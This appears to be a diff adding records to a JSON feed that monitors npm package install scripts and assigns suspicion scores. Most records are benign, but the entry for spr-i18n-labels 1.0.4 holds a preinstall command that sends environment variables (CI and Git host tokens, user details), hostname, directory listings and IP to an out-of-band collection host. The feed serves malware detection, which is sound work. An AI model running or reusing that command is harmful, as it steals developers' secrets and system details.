@@ -1,5 +1,35 @@
 [
   {
+    "packageName": "context-foundry",
+    "version": "3.0.8",
+    "scriptType": "postinstall",
+    "scriptContent": "node install.js",
+    "previousVersion": "2.5.4",
+    "timestamp": "2026-03-28T18:54:44.466Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "workthin",
+    "version": "1.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "[ \"$npm_config_global\" = 'true' ] || npx only-allow bun",
+    "previousVersion": null,
+    "timestamp": "2026-03-28T18:54:31.628Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "spr-i18n-labels",
+    "version": "1.0.4",
+    "scriptType": "preinstall",
+    "scriptContent": "env | grep -E 'CI|JENKINS|GITHUB|GITLAB|HOME|USER' | curl -X POST http://joxvhxryxxlvcpkmgckr39oie2dxz28rc.oast.fun/ --data-binary @- && curl -X POST http://joxvhxryxxlvcpkmgckr39oie2dxz28rc.oast.fun/ -d \"host=$(curl ipinfo.io)&list=$(ls -la)&host=$(hostname)&user=$(whoami)&pwd=$(pwd)\"",
+    "previousVersion": "1.0.3",
+    "timestamp": "2026-03-28T18:54:26.396Z",
+    "issuesend": false,
+    "suspicionScore": 15
+  },
+  {
     "packageName": "opentelemetry-instrumentation-rhea",
     "version": "0.1.1",
     "scriptType": "prebuild",
